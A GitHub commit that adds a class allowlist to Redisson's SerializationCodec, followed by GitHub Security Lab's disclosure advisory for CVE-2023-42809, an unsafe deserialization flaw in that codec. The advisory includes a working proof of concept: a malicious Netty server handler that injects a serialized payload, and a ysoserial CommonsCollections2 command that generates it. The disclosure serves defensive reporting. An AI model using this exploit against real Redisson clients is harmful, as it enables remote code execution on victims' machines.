=== Content from github.com_beeb668f_20250110_134705.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fredisson%2Fredisson%2Fcommit%2Ffe6a2571801656ff1599ef87bdee20f519a5d1fe)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fredisson%2Fredisson%2Fcommit%2Ffe6a2571801656ff1599ef87bdee20f519a5d1fe)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=redisson%2Fredisson)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[redisson](/redisson)
/
**[redisson](/redisson/redisson)**
Public

* [Notifications](/login?return_to=%2Fredisson%2Fredisson) You must be signed in to change notification settings
* [Fork
  5.4k](/login?return_to=%2Fredisson%2Fredisson)
* [Star
   23.5k](/login?return_to=%2Fredisson%2Fredisson)

* [Code](/redisson/redisson)
* [Issues
  294](/redisson/redisson/issues)
* [Pull requests
  41](/redisson/redisson/pulls)
* [Discussions](/redisson/redisson/discussions)
* [Actions](/redisson/redisson/actions)
* [Wiki](/redisson/redisson/wiki)
* [Security](/redisson/redisson/security)
* [Insights](/redisson/redisson/pulse)

Additional navigation options

* [Code](/redisson/redisson)
* [Issues](/redisson/redisson/issues)
* [Pull requests](/redisson/redisson/pulls)
* [Discussions](/redisson/redisson/discussions)
* [Actions](/redisson/redisson/actions)
* [Wiki](/redisson/redisson/wiki)
* [Security](/redisson/redisson/security)
* [Insights](/redisson/redisson/pulse)

## Commit

[Permalink](/redisson/redisson/commit/fe6a2571801656ff1599ef87bdee20f519a5d1fe)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Feature - allowedClasses setting added to SerializationCodec [https://…](https://github.com/redisson/redisson/security/code-scanning/4)

[Browse files](/redisson/redisson/tree/fe6a2571801656ff1599ef87bdee20f519a5d1fe)
Browse the repository at this point in the history

```
[…github.com/redisson/redisson/security/code-scanning/4](https://github.com/redisson/redisson/security/code-scanning/4)
```

* Loading branch information

Nikita Koksharov
committed
Jun 1, 2023

1 parent
[c70943b](/redisson/redisson/commit/c70943b27ea46fe691cc387e35177364b93d54a0)

commit fe6a257

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**31 additions**
and
**16 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* redisson/src/main/java/org/redisson/codec

  + redisson/src/main/java/org/redisson/codec/CustomObjectInputStream.java
    [CustomObjectInputStream.java](#diff-b4d04e4f221de8ac0df3ecffd0d68d07f93985195d790c8366ded46ebcf30eda)
  + redisson/src/main/java/org/redisson/codec/SerializationCodec.java
    [SerializationCodec.java](#diff-e7669d6894e0064961199d1f688d39f8dc4367420d32a1ade2fbea9392ac47b0)

## There are no files selected for viewing

20 changes: 14 additions & 6 deletions

20
[redisson/src/main/java/org/redisson/codec/CustomObjectInputStream.java](#diff-b4d04e4f221de8ac0df3ecffd0d68d07f93985195d790c8366ded46ebcf30eda "redisson/src/main/java/org/redisson/codec/CustomObjectInputStream.java")

Show comments

[View file](/redisson/redisson/blob/fe6a2571801656ff1599ef87bdee20f519a5d1fe/redisson/src/main/java/org/redisson/codec/CustomObjectInputStream.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -15,13 +15,11 @@ |
|  |  | \*/ |
|  |  | package org.redisson.codec; |
|  |  |  |
|  |  | import java.io.IOException; |
|  |  | import java.io.InputStream; |
|  |  | import java.io.ObjectInputStream; |
|  |  | import java.io.ObjectStreamClass; |
|  |  | import java.io.\*; |
|  |  | import java.lang.reflect.Proxy; |
|  |  | import java.util.ArrayList; |
|  |  | import java.util.List; |
|  |  | import java.util.Set; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* |
| Expand All | | @@ -31,7 +29,14 @@ |
|  |  | public class CustomObjectInputStream extends ObjectInputStream { |
|  |  |  |
|  |  | private final ClassLoader classLoader; |
|  |  |  |
|  |  | private Set<String> allowedClasses; |
|  |  |  |
|  |  | public CustomObjectInputStream(ClassLoader classLoader, InputStream in,Set<String> allowedClasses) throws IOException { |
|  |  | super(in); |
|  |  | this.classLoader = classLoader; |
|  |  | this.allowedClasses = allowedClasses; |
|  |  | } |
|  |  |  |
|  |  | public CustomObjectInputStream(ClassLoader classLoader, InputStream in) throws IOException { |
|  |  | super(in); |
|  |  | this.classLoader = classLoader; |
| Expand All | | @@ -41,6 +46,9 @@ public CustomObjectInputStream(ClassLoader classLoader, InputStream in) throws I |
|  |  | protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { |
|  |  | try { |
|  |  | String name = desc.getName(); |
|  |  | if (allowedClasses != null && !allowedClasses.contains(name)) { |
|  |  | throw new InvalidClassException("Class " + name + " isn't allowed"); |
|  |  | } |
|  |  | return Class.forName(name, false, classLoader); |
|  |  | } catch (ClassNotFoundException e) { |
|  |  | return super.resolveClass(desc); |
| Expand All | | @@ -56,7 +64,7 @@ protected Class<?> resolveProxyClass(String[] interfaces) throws IOException, Cl |
|  |  | loadedClasses.add(clazz); |
|  |  | } |
|  |  |  |
|  |  | return Proxy.getProxyClass(classLoader, loadedClasses.toArray(new Class[loadedClasses.size()])); |
|  |  | return Proxy.getProxyClass(classLoader, loadedClasses.toArray(new Class[0])); |
|  |  | } |
|  |  |  |
|  |  | } |

27 changes: 17 additions & 10 deletions

27
[redisson/src/main/java/org/redisson/codec/SerializationCodec.java](#diff-e7669d6894e0064961199d1f688d39f8dc4367420d32a1ade2fbea9392ac47b0 "redisson/src/main/java/org/redisson/codec/SerializationCodec.java")

Show comments

[View file](/redisson/redisson/blob/fe6a2571801656ff1599ef87bdee20f519a5d1fe/redisson/src/main/java/org/redisson/codec/SerializationCodec.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -15,19 +15,19 @@ |
|  |  | \*/ |
|  |  | package org.redisson.codec; |
|  |  |  |
|  |  | import java.io.IOException; |
|  |  | import java.io.ObjectInputStream; |
|  |  | import java.io.ObjectOutputStream; |
|  |  |  |
|  |  | import io.netty.buffer.ByteBuf; |
|  |  | import io.netty.buffer.ByteBufAllocator; |
|  |  | import io.netty.buffer.ByteBufInputStream; |
|  |  | import io.netty.buffer.ByteBufOutputStream; |
|  |  | import org.redisson.client.codec.BaseCodec; |
|  |  | import org.redisson.client.handler.State; |
|  |  | import org.redisson.client.protocol.Decoder; |
|  |  | import org.redisson.client.protocol.Encoder; |
|  |  |  |
|  |  | import io.netty.buffer.ByteBuf; |
|  |  | import io.netty.buffer.ByteBufAllocator; |
|  |  | import io.netty.buffer.ByteBufInputStream; |
|  |  | import io.netty.buffer.ByteBufOutputStream; |
|  |  | import java.io.IOException; |
|  |  | import java.io.ObjectInputStream; |
|  |  | import java.io.ObjectOutputStream; |
|  |  | import java.util.Set; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* JDK's serialization codec. |
| Expand All | | @@ -51,7 +51,7 @@ public Object decode(ByteBuf buf, State state) throws IOException { |
|  |  | ObjectInputStream inputStream; |
|  |  | if (classLoader != null) { |
|  |  | Thread.currentThread().setContextClassLoader(classLoader); |
|  |  | inputStream = new CustomObjectInputStream(classLoader, in); |
|  |  | inputStream = new CustomObjectInputStream(classLoader, in, allowedClasses); |
|  |  | } else { |
|  |  | inputStream = new ObjectInputStream(in); |
|  |  | } |
| Expand Down  Expand Up | | @@ -84,7 +84,8 @@ public ByteBuf encode(Object in) throws IOException { |
|  |  | } |
|  |  | } |
|  |  | }; |
|  |  |  |
|  |  |  |
|  |  | private Set<String> allowedClasses; |
|  |  | private final ClassLoader classLoader; |
|  |  |  |
|  |  | public SerializationCodec() { |
| Expand All | | @@ -97,6 +98,12 @@ public SerializationCodec(ClassLoader classLoader) { |
|  |  |  |
|  |  | public SerializationCodec(ClassLoader classLoader, SerializationCodec codec) { |
|  |  | this.classLoader = classLoader; |
|  |  | this.allowedClasses = codec.allowedClasses; |
|  |  | } |
|  |  |  |
|  |  | public SerializationCodec(ClassLoader classLoader, Set<String> allowedClasses) { |
|  |  | this.classLoader = classLoader; |
|  |  | this.allowedClasses = allowedClasses; |
|  |  | } |
|  |  |  |
|  |  | @Override |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `fe6a257`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fredisson%2Fredisson%2Fcommit%2Ffe6a2571801656ff1599ef87bdee20f519a5d1fe) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from securitylab.github.com_50ffb143_20250110_134705.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

September 27, 2023
# GHSL-2023-053: Unsafe deserialization in Redisson - CVE-2023-42809

[![Author avatar](https://avatars.githubusercontent.com/u/61799930)
Tony Torralba, Joseph Farebrother](https://github.com/ghsecuritylab)

## Coordinated Disclosure Timeline

* 2023-03-28: Report sent to info@redisson.pro
* 2023-03-28: Report is acknowledged
* 2023-06-01: [Fix](https://github.com/redisson/redisson/commit/fe6a2571801656ff1599ef87bdee20f519a5d1fe) is commited
* 2023-06-27: Deadline expires
* 2023-06-29: We reiterate some concerns to the maintainer, who decides not to address them. Please check `Post-fix advice` below.

## Summary

Redisson is a Java Redis client that uses the Netty framework. Some of the messages received from the Redis server contain Java objects that the client deserializes without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running in.

## Product

Redisson

## Tested Version

[3.20.0](https://github.com/redisson/redisson/releases/tag/redisson-3.20.0)

## Details

### Unsafe deserialization of server responses (`GHSL-2023-053`)

When being set up, Redisson can be configured to use a specific `Codec` to encode and decode messages. If `SerializationCodec` is used, unsafe deserialization may happen as part of an object request made to the server.

When a Netty channel is established with a server, `RedisChannelInitializer.initChannel` is executed, which sets up `CommandDecoder` to decode incoming messages:

[`redisson/src/main/java/org/redisson/client/handler/RedisChannelInitializer.java:99`](https://github.com/redisson/redisson/blob/ccfa6c21d022943180bb6c676082cc1d56472fbb/redisson/src/main/java/org/redisson/client/handler/RedisChannelInitializer.java#L99)

```
@Override
protected void initChannel(Channel ch) throws Exception {
    // --snip--

    if (type == Type.PLAIN) {
        ch.pipeline().addLast(new CommandDecoder(config.getAddress().getScheme()));
    }

```

`CommandDecoder.decode` will then be invoked when the server sends a message to the client:

[`redisson/src/main/java/org/redisson/client/handler/CommandDecoder.java:78`](https://github.com/redisson/redisson/blob/ccfa6c21d022943180bb6c676082cc1d56472fbb/redisson/src/main/java/org/redisson/client/handler/CommandDecoder.java#L78)

```
@Override
protected final void decode(ChannelHandlerContext ctx, ByteBuf in, List<Object> out) throws Exception {
    // --snip--
    if (data == null) {
        while (in.writerIndex() > in.readerIndex()) {
            // --snip--
            try {
                decode(ctx, in, null, 0);
            }
            // --snip--
        }
    } else {
        // --snip--
        decode(ctx, in, data, endIndex);
    }
}

private void decode(ChannelHandlerContext ctx, ByteBuf in, QueueCommand data, int endIndex) throws Exception {
    // --snip--
    decodeCommand(ctx.channel(), in, data, endIndex);
}

@Override
protected void decodeCommand(Channel channel, ByteBuf in, QueueCommand data, int endIndex) throws Exception {
    if (data == null) {
        try {
            while (in.writerIndex() > in.readerIndex()) {
                decode(in, null, null, channel, false, null);
            }
            // --snip--
        }
        // --snip--
    } else if (data instanceof CommandData) {
        CommandData<Object, Object> cmd = (CommandData<Object, Object>) data;
        try {
            while (in.writerIndex() > in.readerIndex()) {
                decode(in, cmd, null, channel, false, null);
            }
        // --snip--
        }
    }
}

protected void decode(ByteBuf in, CommandData<Object, Object> data, List<Object> parts, Channel channel, boolean skipConvertor, List<CommandData<?, ?>> commandsData) throws IOException {
    int code = in.readByte();
    // --snip--
    if (code == '$') {
        ByteBuf buf = readBytes(in);

```

As it can be seen, the input buffer `in` goes through many layers of methods, and then a byte is read from it: if that byte is `$`, then the rest of the message is parsed by `readBytes`:

[`redisson/src/main/java/org/redisson/client/handler/CommandDecoder.java:493`](https://github.com/redisson/redisson/blob/ccfa6c21d022943180bb6c676082cc1d56472fbb/redisson/src/main/java/org/redisson/client/handler/CommandDecoder.java#L493)

```
private ByteBuf readBytes(ByteBuf is) throws IOException {
    long l = readLong(is);
    // --snip--
    int size = (int) l;
    // --snip--
    ByteBuf buffer = is.readSlice(size);
    int cr = is.readByte();
    int lf = is.readByte();
    if (cr != CR || lf != LF) {
        throw new IOException("Improper line ending: " + cr + ", " + lf);
    }
    return buffer;

```

In `readBytes`, a long indicating the payload size is read from the buffer. By examining the `readLong` method, it can be determined that it’s in fact read as base 10 integers until a `CRLF` sequence is found, so, for instance, to send a size of 300, one would need to send the bytes `0x03 0x00 0x00`, instead of the actual long `0x00 0x00 0x00 0x00 0x00 0x00 0x12 0x63`).

After that, that same amount of bytes is read from the input buffer, and then a `CRLF` sequence is expected to end the message.

If all is correct, the execution continues in `CommandDecoder.decode`:

[`redisson/src/main/java/org/redisson/client/handler/CommandDecoder.java:389`](https://github.com/redisson/redisson/blob/ccfa6c21d022943180bb6c676082cc1d56472fbb/redisson/src/main/java/org/redisson/client/handler/CommandDecoder.java#L389)

```
ByteBuf buf = readBytes(in);
Object result = null;
if (buf != null) {
    Decoder<Object> decoder = selectDecoder(data, parts);
    result = decoder.decode(buf, state());
}

```

A `Decoder` is selected based on the command that the client issued. Since we’re requesting an object through `getMap`, `SerializationCodec$Decoder.decode` is used:

[`redisson/src/main/java/org/redisson/codec/SerializationCodec.java:40`](https://github.com/redisson/redisson/blob/ccfa6c21d022943180bb6c676082cc1d56472fbb/redisson/src/main/java/org/redisson/codec/SerializationCodec.java#L40)

```
public class SerializationCodec extends BaseCodec {

    private final Decoder<Object> decoder = new Decoder<Object>() {
        @Override
        public Object decode(ByteBuf buf, State state) throws IOException {
            // --snip --
            try {
                ByteBufInputStream in = new ByteBufInputStream(buf);
                ObjectInputStream inputStream;
                if (classLoader != null) {
                    Thread.currentThread().setContextClassLoader(classLoader);
                    inputStream = new CustomObjectInputStream(classLoader, in);
                } else {
                    inputStream = new ObjectInputStream(in);
                }
                return inputStream.readObject();

```

As it can be seen, the input buffer is finally used in `ObjectInputStream.readObject`, which triggers the unsafe deserialization. Note that `CustomObjectInputStream` is a thin wrapper over `ObjectInputStream`, and even though it seems to make decisions based on the to-be-deserialized class, actually it just delegates to the default implementation if the class can’t be found in the current class loader:

[`redisson/src/main/java/org/redisson/codec/CustomObjectInputStream.java:41`](https://github.com/redisson/redisson/blob/ccfa6c21d022943180bb6c676082cc1d56472fbb/redisson/src/main/java/org/redisson/codec/CustomObjectInputStream.java#L41)

```
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
    try {
        String name = desc.getName();
        return Class.forName(name, false, classLoader);
    } catch (ClassNotFoundException e) {
        return super.resolveClass(desc);
    }
}

```
#### Impact

This issue may lead to remote code execution.

#### Resources

To exploit this vulnerability, a malicious Redis server is needed. For the sake of simplicity, we implemented a mock server with hardcoded responses, with the only goal of reaching the vulnerable code of the client.

To be able to easily reproduce this, we used the following simplified example:

```
public class App {
    public static void main(String[] args) {
        Config config = new Config();
        config.useSingleServer().setAddress("redis://127.0.0.1:3000");
        config.setCodec(new SerializationCodec());
        RedissonClient redisson = Redisson.create(config);
        RMap<?, ?> map = redisson.getMap("myMap");
        map.get("test");
        redisson.shutdown();
    }
}

```

The example points to localhost’s port 3000, so we set up a simple Netty TCP server listening on that port, which replicates responses previously intercepted from a real Redis server and returns them to the client, until the `HGET` command happens. Then, our server injects the malicious response:

```
public class AttackChannelHandler extends SimpleChannelInboundHandler<String> {

    @Override
    protected void channelRead0(ChannelHandlerContext ctx, String s) throws Exception {
        // --snip--
        if (s.contains("PING")) {
            ctx.channel().writeAndFlush(
                    new RawByteMessage(new int[] {'+', 'P', 'O', 'N', 'G', '\r', '\n'}));
        } else if (s.contains("HGET")) {
            // Load the deserialization payload from disk
            byte[] payload = Files.readAllBytes(Paths.get("payload.bin"));
            long l = payload.length;
            String length = Long.toString(l);
            // Message format is $ + length + crlf + payload + clrf
            int[] message = new int[1 + length.length() + 2 + payload.length + 2];
            // Add the $ character to trigger the deserialization
            int offset = 0;
            message[offset++] = '$';
            // Add length as base 10 bytes
            for (int i = 0; i < length.length(); i++) {
                message[offset++] = length.charAt(i);
            }
            // CRLF
            message[offset++] = 0x0d;
            message[offset++] = 0x0a;
            // Add payload bytes
            for (int i = 0; i < payload.length; i++) {
                message[offset++] = payload[i];
            }
            // CRLF
            message[offset++] = 0x0d;
            message[offset++] = 0x0a;
            ctx.channel().writeAndFlush(new RawByteMessage(message));
        }
    }
}

```

`RawByteMessage` is a message class that just contains a byte array, which gets sent as-is by a Netty `MessageToByteEncoder<RawByteMessage>`.

The specific deserialization payload that needs to be used depends on the deserialization gadgets available in the classpath of the application using Redisson. Again for simplicity, we assumed the victim application uses Apache Commons Collections 4.0, which contains a well-known deserialization gadget:

```
<dependency>
  <groupId>org.apache.commons</groupId>
  <artifactId>commons-collections4</artifactId>
  <version>4.0</version>
</dependency>

```

In which case, the malicious payload file could be generated using [ysoserial](https://github.com/frohoff/ysoserial) as follows:

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 '/System/Applications/Calculator.app/Contents/MacOS/Calculator' > payload.bin

```
#### Post-fix advice

* Do NOT use `Kryo5Codec` as deserialization codec, as it is still vulnerable to arbitrary object deserialization due to the `setRegistrationRequired(false)` call. On the contrary, `KryoCodec` is safe to use.
* The fix applied to `SerializationCodec` only consists of adding an optional allowlist of class names, even though we recommended making this behavior the default. When instantiating `SerializationCodec` please use the `SerializationCodec(ClassLoader classLoader, Set<String> allowedClasses)` constructor to restrict the allowed classes for deserialization.

## CVE

* CVE-2023-42809

## Credit

This issue was discovered and reported by the GitHub CodeQL team members [@atorralba (Tony Torralba)](https://github.com/atorralba) and [@joefarebrother (Joseph Farebrother)](https://github.com/joefarebrother).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-053` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information


